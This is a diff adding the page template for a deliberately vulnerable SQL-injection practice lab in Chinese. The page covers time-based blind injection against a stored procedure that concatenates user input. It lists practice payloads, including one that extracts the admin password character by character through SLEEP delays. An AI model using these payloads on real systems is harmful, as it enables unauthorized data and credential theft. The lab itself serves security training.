@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>时间盲注 - 实验区</title>
+    <link rel="stylesheet" th:href="@{/lab/lab.css}">
+</head>
+<body>
+<div th:replace="~{lab/partials/nav :: nav('time')}"></div>
+
+<main class="page">
+    <section class="hero">
+        <div class="eyebrow">Time Blind</div>
+        <h1>时间盲注</h1>
+        <p>SQL 拼接发生在 MySQL 存储过程 <code class="mono">lab_user_by_id</code> 内。结果页面不再区分真假记录，但追加 <code class="mono">SLEEP</code> 后会产生明显耗时差异。</p>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <div>
+                <h2>延时判断入口</h2>
+                <p>存储过程内拼出 <code class="mono">WHERE id = </code> + 输入，正常请求应毫秒级返回。</p>
+            </div>
+            <a class="btn btn-ghost btn-sm" th:href="@{/lab}">返回总览</a>
+        </div>
+        <div class="panel-body">
+            <form class="form-grid" method="get" th:action="@{/lab/sql/time}">
+                <div class="field">
+                    <label for="time-id">id 参数</label>
+                    <input id="time-id" class="mono" type="text" name="id" th:value="${idInput}" autofocus>
+                </div>
+                <div class="field">
+                    <button class="btn btn-primary" type="submit">执行</button>
+                </div>
+            </form>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>执行结果</h2>
+            <span class="status-pill info">耗时 <span class="mono" th:text="${elapsedMs} ?: 0">0</span> ms</span>
+        </div>
+        <div class="panel-body">
+            <div th:if="${dbError != null}" class="db-error" th:text="${dbError}">数据库错误</div>
+            <div th:if="${rowCount > 0}" class="notice">
+                <strong>条件为真</strong>：查询命中，服务端耗时约 <span class="mono" th:text="${elapsedMs}">0</span> 毫秒。
+            </div>
+            <div th:if="${rowCount == 0 and dbError == null}" class="notice">
+                <strong>无记录返回</strong>：若载荷中包含 SLEEP，真实延时仍可作为判断依据。
+            </div>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>练习载荷</h2>
+        </div>
+        <div class="panel-body">
+            <ul class="payload-list">
+                <li>1 AND SLEEP(2)</li>
+                <li>1 AND IF(1=1,SLEEP(2),0)</li>
+                <li>1 AND IF(substring(database(),1,1)='s',SLEEP(2),0)</li>
+                <li>1 AND IF(ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))&gt;90,SLEEP(2),0)</li>
+            </ul>
+        </div>
+        <div class="panel-footer">延时越短练习越舒服；不要在生产或高并发环境中复现此类请求。</div>
+    </section>
+</main>
+</body>
+</html>
